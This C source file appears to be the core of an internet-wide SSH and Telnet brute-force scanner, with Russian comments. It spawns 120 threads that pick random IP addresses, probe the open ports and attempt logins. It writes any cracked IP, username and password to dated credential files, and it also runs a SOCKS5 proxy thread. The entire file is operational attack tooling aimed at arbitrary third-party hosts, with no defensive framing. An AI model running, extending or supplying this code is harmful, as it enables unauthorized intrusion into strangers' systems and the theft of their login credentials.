#include "bruteforce/ssh_bruteforce.c"
#include "bruteforce/telnet_bruteforce.c"
#include "socks5/proxy.h"
#include "include/includes.h"
#include "find_ips/finder.h"

// Добавьте новую функцию для сохранения учетных данных в файл:
void save_credentials_to_file(const char *ip, const char *service, const char *username, const char *password) {
    FILE *file;
    char filename[64];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    
    // Создаем имя файла в формате: credentials_YYYY-MM-DD.txt
    snprintf(filename, sizeof(filename), "credentials_%d-%02d-%02d.txt", 
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);
    
    // Открываем файл в режиме добавления
    file = fopen(filename, "a");
    if (file == NULL) {
        fprintf(stderr, "Ошибка при открытии файла для сохранения учетных данных\n");
        return;
    }
    
    // Записываем данные в формате: [TIME] SERVICE IP:USERNAME:PASSWORD
    fprintf(file, "[%02d:%02d:%02d] %s %s:%s:%s\n",
            t->tm_hour, t->tm_min, t->tm_sec,
            service, ip, username, password);
    
    fclose(file);
}

// Обновленные функции потоков:
void *ssh_bruteforce_thread(void *arg) {
    while (1) {
        char ip_address[IP_ADDRESS_LENGTH];
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP для SSH: %s\n", ip_address);
        fflush(stdout);
        
        if (check_port_open_on_ip(ip_address, SSH_PORT) == 1) {
            Credentials ssh_credentials = ssh_brute(ip_address);
            if (ssh_credentials.good) {
                printf("Успешный вход SSH: %s:%s\n", 
                       ssh_credentials.username, ssh_credentials.password);
                fflush(stdout);
                save_credentials_to_file(ip_address, "SSH", 
                                       ssh_credentials.username, 
                                       ssh_credentials.password);
            }
        }
        sleep(0.1);
    }
    return NULL;
}

void *telnet_bruteforce_thread(void *arg) {
    while (1) {
        char ip_address[IP_ADDRESS_LENGTH];
        generate_random_ip(ip_address, IP_ADDRESS_LENGTH);
        printf("Проверка IP для Telnet: %s\n", ip_address);
        fflush(stdout);

        if (check_port_open_on_ip(ip_address, TELNET_PORT) == 1) {
            Credentials telnet_credentials = telnet_brute(ip_address);
            if (telnet_credentials.good) {
                printf("Успешный вход Telnet: %s:%s\n", 
                       telnet_credentials.username, telnet_credentials.password);
                fflush(stdout);
                save_credentials_to_file(ip_address, "TELNET", 
                                       telnet_credentials.username, 
                                       telnet_credentials.password);
            }
        }
        sleep(0.1);
    }
    return NULL;
}

// Добавьте функцию для создания директории с результатами
void ensure_results_directory() {
    struct stat st = {0};
    if (stat("results", &st) == -1) {
        #ifdef _WIN32
            _mkdir("results");
        #else
            mkdir("results", 0700);
        #endif
    }
}

// Обновите main(), добавив создание директории:
// Обновите main(), добавив создание директории:
int main() {
    while (1) {
        // Создаем директорию для результатов
        ensure_results_directory();
        
        pthread_t ssh_threads[60];
        pthread_t telnet_threads[60];
        pthread_t socks5_thread_id;

        // Создание потоков для SSH брутфорса
        for (int i = 0; i < 60; i++) {
            if (pthread_create(&ssh_threads[i], NULL, ssh_bruteforce_thread, NULL) != 0) {
                fprintf(stderr, "Ошибка при создании потока SSH брутфорса\n");
                return 1;
            }
        }

        // Создание потоков для Telnet брутфорса
        for (int i = 0; i < 60; i++) {
                if (pthread_create(&telnet_threads[i], NULL, telnet_bruteforce_thread, NULL) != 0) {
                    fprintf(stderr, "Ошибка при создании потока Telnet брутфорса\n");
                    return 1;
            }
        }

        // Создание потока для SOCKS5 прокси
        if (pthread_create(&socks5_thread_id, NULL, main_socks, NULL) != 0) {
            fprintf(stderr, "Ошибка при создании потока SOCKS5\n");
            return 1;
        }

        // Ожидание завершения потоков SSH
        for (int i = 0; i < 60; i++) {
            pthread_join(ssh_threads[i], NULL);
        }

        // Ожидание завершения потоков Telnet
        for (int i = 0; i < 60; i++) {
            pthread_join(telnet_threads[i], NULL);
        }

        // Ожидание завершения потока SOCKS5
        pthread_join(socks5_thread_id, NULL);

        return 0;
    }
}
